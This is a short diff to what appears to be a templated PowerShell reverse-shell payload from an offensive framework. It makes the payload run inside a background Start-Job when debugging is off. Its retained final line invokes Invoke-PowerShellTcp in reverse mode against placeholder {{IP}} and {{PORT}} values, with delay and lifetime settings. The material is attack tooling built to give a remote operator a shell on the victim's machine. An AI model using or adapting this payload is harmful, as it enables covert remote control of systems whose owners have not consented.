@@ -1,4 +1,4 @@
-# Start-Job -ScriptBlock {
+{{'Start-Job -ScriptBlock {'|nodebug}}
 
 {{'$DebugPreference = "Continue"'|debug}}
 
@@ -334,4 +334,5 @@ function Invoke-PowerShellTcp
 
 
 Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse -Delay {{delay}} -LifeTime {{lifetime}}
-# }
+
+{{'}'|nodebug}}
